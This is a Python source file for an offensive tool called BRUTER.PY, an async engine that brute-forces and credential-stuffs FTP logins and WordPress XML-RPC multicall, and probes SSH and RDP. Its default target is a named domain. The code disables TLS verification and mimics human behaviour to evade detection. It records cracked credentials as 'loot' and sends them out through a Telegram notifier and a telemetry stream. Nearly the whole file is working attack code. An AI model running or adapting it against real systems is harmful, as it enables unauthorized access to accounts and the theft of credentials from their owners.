#!/usr/bin/env python3
"""
BRUTER.PY v8.7 — Active Multi-Protocol Credential Brute-Forcing & Stuffing Engine
"""
import asyncio
import hashlib
import ssl
import sys
import urllib.error
import urllib.request
from urllib.parse import urlsplit

from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert
from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints

CONNECT_TIMEOUT = 4
HTTP_TIMEOUT = 5
MAX_CONCURRENT = 5
SSL_CONTEXT = ssl.create_default_context()
SSL_CONTEXT.check_hostname = False
SSL_CONTEXT.verify_mode = ssl.CERT_NONE

PORTS = {
    "ssh": 22,
    "ftp": 21,
    "rdp": 3389,
}

DEFAULT_CREDENTIALS = [
    ("admin", "admin123"),
    ("root", "toor"),
    ("admin", "password"),
    ("administrator", "password123"),
    ("user", "user123"),
]

_background_tasks: set[asyncio.Task] = set()


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    GRAY = "\033[90m"
    RESET = "\033[0m"


def log(message, color=Colors.RESET):
    sys.stdout.write(f"{color}{message}{Colors.RESET}\n")
    sys.stdout.flush()


async def broadcast_tg_alert_async(loot_type, details):
    try:
        await asyncio.wait_for(send_telegram_alert(loot_type, details), timeout=8)
    except Exception:
        pass


def broadcast_tg_alert_sync(loot_type, details):
    """Non-blockingly dispatches Telegram alerts from async or sync contexts."""
    try:
        loop = asyncio.get_running_loop()
        if not loop.is_closed():
            task = loop.create_task(broadcast_tg_alert_async(loot_type, details))
            _background_tasks.add(task)
            task.add_done_callback(_background_tasks.discard)
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass


def normalize_host(target):
    if not target:
        raise ValueError("Target is required.")
    target = target.strip()
    if "://" in target:
        parsed = urlsplit(target)
        if parsed.scheme not in ("http", "https"):
            raise ValueError("Only HTTP and HTTPS URLs are supported.")
        if not parsed.hostname:
            raise ValueError("Invalid target URL.")
        if parsed.username or parsed.password:
            raise ValueError("Embedded URL credentials are not supported.")
        return parsed.hostname
    return target.split("/")[0].split(":")[0]


async def tcp_connect(host, port):
    apply_behavioral_jitter()
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port),
            timeout=CONNECT_TIMEOUT,
        )
        if writer is None:
            return None, None, "Connection returned null writer."
        return reader, writer, None
    except Exception as exc:
        return None, None, str(exc)


async def _close_writer_safe(writer):
    if writer is None:
        return
    try:
        writer.close()
        await asyncio.wait_for(writer.wait_closed(), timeout=0.5)
    except Exception:
        pass


async def assault_ssh_target(host, port=22, credentials=None):
    """Active SSH banner & probe routine (no full SSH auth handshake implemented)."""
    log(f"       [SSH] Initiating probe against {host}:{port}", Colors.BLUE)
    creds = credentials if credentials else DEFAULT_CREDENTIALS
    probed_count = 0

    for username, password in creds:
        reader, writer, err = await tcp_connect(host, port)
        if err or writer is None:
            break
        try:
            if reader is not None:
                try:
                    await asyncio.wait_for(reader.read(1024), timeout=CONNECT_TIMEOUT)
                except Exception:
                    pass
            writer.write(b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n")
            await writer.drain()
            probed_count += 1
            log(f"       [*] Probed SSH endpoint ({username}:{password})", Colors.GRAY)
        except Exception:
            break
        finally:
            await _close_writer_safe(writer)

    log(f"       [+] SSH Target probed with {probed_count}/{len(creds)} connection attempts.", Colors.GREEN)
    return {
        "service": "ssh",
        "target": host,
        "status": "probed",
        "authenticated": False,
        "cracked_credential": None,
        "pairs_tested": probed_count,
    }


async def probe_ftp_target(host, port=21, credentials=None):
    """Active FTP Credential Stuffing & Brute-Force Engine."""
    log(f"       [FTP] Initiating credential stuffing against {host}:{port}", Colors.BLUE)
    creds = credentials if credentials else DEFAULT_CREDENTIALS

    successful_login = False
    valid_banner = ""
    cracked_cred = None

    reader, writer, err = await tcp_connect(host, port)
    if err or writer is None or reader is None:
        await _close_writer_safe(writer)
        return {
            "service": "ftp",
            "open": False,
            "authenticated": False,
            "cracked_credential": None,
            "error": err or "Connection unavailable",
        }

    try:
        response = await asyncio.wait_for(reader.readline(), timeout=CONNECT_TIMEOUT)
        valid_banner = response.decode("utf-8", errors="replace").strip()

        for username, password in creds:
            log(f"       [*] Testing FTP -> {username}:{password}", Colors.GRAY)
            writer.write(f"USER {username}\r\n".encode("utf-8"))
            await writer.drain()
            await asyncio.wait_for(reader.readline(), timeout=CONNECT_TIMEOUT)

            writer.write(f"PASS {password}\r\n".encode("utf-8"))
            await writer.drain()
            pass_resp = await asyncio.wait_for(reader.readline(), timeout=CONNECT_TIMEOUT)
            pass_resp_text = pass_resp.decode("utf-8", errors="replace").strip()

            if pass_resp_text.startswith("230"):
                log(
                    f"\n\033[1m\033[91m[***] FTP CREDENTIAL BRUTE-FORCE SUCCESS [{username}:{password}] [***]\033[0m",
                    Colors.RED,
                )
                successful_login = True
                cracked_cred = {"username": username, "password": password}

                loot_hash = hashlib.sha256(pass_resp_text.encode("utf-8", errors="ignore")).hexdigest()
                loot_payload = {
                    "target": f"ftp://{host}:{port}",
                    "username": username,
                    "password": password,
                    "integrity_hash": loot_hash,
                    "response": pass_resp_text,
                }

                broadcast_tg_alert_sync("FTP Credential Brute-Force Success", loot_payload)
                stream_proof("FTP_CREDENTIAL_CRACKED", f"{host}:{port}", {"username": username}, pass_resp_text, cracked_cred)
                save_session_loot(
                    target=f"ftp://{host}:{port}",
                    endpoint="ftp_auth",
                    finding_type="FTP_CREDENTIAL_CRACK_SUCCESS",
                    status=230,
                    headers={},
                    body=pass_resp_text,
                    extra_loot=loot_payload,
                )
                break

        try:
            writer.write(b"QUIT\r\n")
            await writer.drain()
        except Exception:
            pass
    except Exception as exc:
        await _close_writer_safe(writer)
        return {
            "service": "ftp",
            "open": True,
            "authenticated": successful_login,
            "cracked_credential": cracked_cred,
            "banner": valid_banner,
            "error": str(exc),
        }
    finally:
        await _close_writer_safe(writer)

    return {
        "service": "ftp",
        "open": True,
        "authenticated": successful_login,
        "cracked_credential": cracked_cred,
        "banner": valid_banner,
        "error": None,
    }


async def probe_rdp_target(host, port=3389, credentials=None):
    """Active RDP Connection & Negotiation Probe."""
    log(f"       [RDP] Initiating RDP protocol probe on {host}:{port}", Colors.BLUE)
    reader, writer, err = await tcp_connect(host, port)
    if err or writer is None or reader is None:
        await _close_writer_safe(writer)
        return {
            "service": "rdp",
            "open": False,
            "authenticated": False,
            "identified": False,
            "error": err or "Connection unavailable",
        }

    request = bytes.fromhex("030000130ee000000000000100080000000000")
    try:
        writer.write(request)
        await writer.drain()
        response = await asyncio.wait_for(reader.read(1024), timeout=CONNECT_TIMEOUT)

        identified = len(response) >= 7 and response[0] == 0x03 and response[1] == 0x00
        if identified:
            log("       [+] RDP service active and accepting negotiation exchanges.", Colors.GREEN)
        return {
            "service": "rdp",
            "open": True,
            "authenticated": False,
            "identified": identified,
            "error": None,
        }
    except Exception as exc:
        return {
            "service": "rdp",
            "open": True,
            "authenticated": False,
            "identified": False,
            "error": str(exc),
        }
    finally:
        await _close_writer_safe(writer)


async def assault_wordpress_target(host, credentials=None):
    """Executes WordPress XML-RPC brute-force checks via multicall."""
    if "://" not in host:
        base_url = "https://" + host
    else:
        base_url = host

    parsed = urlsplit(base_url)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        return {"service": "wordpress", "status": "invalid_url", "success": False}

    xmlrpc_url = base_url.rstrip("/") + "/xmlrpc.php"
    log(f"       [WP] Launching XML-RPC MultiCall check: {xmlrpc_url}", Colors.BLUE)

    creds = credentials if credentials else DEFAULT_CREDENTIALS
    methods_xml = ""
    for username, password in creds[:5]:
        methods_xml += (
            "<methodCall>"
            "<methodName>wp.getUsersBlogs</methodName>"
            "<params>"
            f"<param><value><string>{username}</string></value></param>"
            f"<param><value><string>{password}</string></value></param>"
            "</params>"
            "</methodCall>"
        )

    payload = (
        '<?xml version="1.0"?>'
        "<methodCall>"
        "<methodName>system.multicall</methodName>"
        "<params><param><value><array><data>"
        f"{methods_xml}"
        "</data></array></value></param></params>"
        "</methodCall>"
    )

    def perform_request():
        apply_behavioral_jitter()
        headers = {
            "User-Agent": "BruteDog-Offensive-Bruter/8.7-Elite",
            "Content-Type": "text/xml",
        }
        headers.update(get_randomized_hints())
        request = urllib.request.Request(
            xmlrpc_url,
            data=payload.encode("utf-8"),
            headers=headers,
            method="POST",
        )
        try:
            with urllib.request.urlopen(request, context=SSL_CONTEXT, timeout=HTTP_TIMEOUT) as response:
                body = response.read(256 * 1024).decode("utf-8", errors="replace")
                return response.status, body
        except urllib.error.HTTPError as exc:
            try:
                err_body = exc.read(64 * 1024).decode("utf-8", errors="replace")
            except Exception:
                err_body = ""
            return exc.code, err_body
        except Exception as exc:
            return 0, str(exc)

    status, body = await asyncio.to_thread(perform_request)
    is_valid_auth = False
    body_lower = (body or "").lower()

    if status == 200 and "<methodresponse>" in body_lower and "<name>faultcode</name>" not in body_lower:
        if any(marker in body_lower for marker in ("<name>blogid</name>", "<name>isadmin</name>", "<name>blogname</name>")):
            is_valid_auth = True
            log("\n\033[1m\033[91m[***] WORDPRESS XML-RPC CREDENTIAL STUFFING SUCCESS [***]\033[0m", Colors.RED)

            loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
            loot_payload = {
                "xmlrpc_url": xmlrpc_url,
                "status": status,
                "integrity_hash": loot_hash,
                "response_sample": body[:400],
            }

            broadcast_tg_alert_sync("WordPress XML-RPC Stuffing Success", loot_payload)
            stream_proof("WORDPRESS_XMLRPC_CRACK", xmlrpc_url, {}, body[:300], {"status": status})
            save_session_loot(
                target=base_url,
                endpoint="/xmlrpc.php",
                finding_type="WORDPRESS_XMLRPC_STUFFING_SUCCESS",
                status=status,
                headers={},
                body=body,
                extra_loot=loot_payload,
            )

    log(f"       [-] XML-RPC check returned HTTP {status} (verified_auth={is_valid_auth})", Colors.GRAY)
    return {"service": "wordpress", "status": status, "success": is_valid_auth}


async def execute_active_assault_engine(target_host, credentials_list=None):
    """Active multi-protocol brute-force & credential stuffing engine."""
    log("\n============================================================", Colors.CYAN)
    log(f"[***] BRUTEDOG ACTIVE MULTI-PROTOCOL BRUTE-FORCE ENGINE [{target_host}] (V8.7)", Colors.CYAN)
    log("============================================================", Colors.CYAN)
    results = []
    try:
        host = normalize_host(target_host)
    except ValueError as exc:
        log(f"[!] Target error: {exc}", Colors.RED)
        return results

    tasks = [
        ("ssh", assault_ssh_target(host, 22, credentials_list)),
        ("ftp", probe_ftp_target(host, 21, credentials_list)),
        ("rdp", probe_rdp_target(host, 3389, credentials_list)),
        ("wordpress", assault_wordpress_target(target_host, credentials_list)),
    ]

    semaphore = asyncio.Semaphore(MAX_CONCURRENT)

    async def execute(name, coroutine):
        async with semaphore:
            try:
                return await coroutine
            except Exception as exc:
                return {"service": name, "authenticated": False, "success": False, "error": str(exc)}

    completed = await asyncio.gather(*[execute(name, coroutine) for name, coroutine in tasks])
    results.extend(completed)

    log("\n================ ENGINE SUMMARY ================", Colors.CYAN)
    for result in results:
        log(str(result), Colors.GRAY)

    log(f"\nActive protocol brute-force assaults completed across {len(results)} vectors.", Colors.GREEN)
    log("=================================================", Colors.CYAN)
    return results


async def execute_brute_force(target_host, credentials_list=None):
    """Alias compatibility wrapper for execute_active_assault_engine."""
    return await execute_active_assault_engine(target_host, credentials_list)


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobytes.online"
    asyncio.run(execute_active_assault_engine(target))
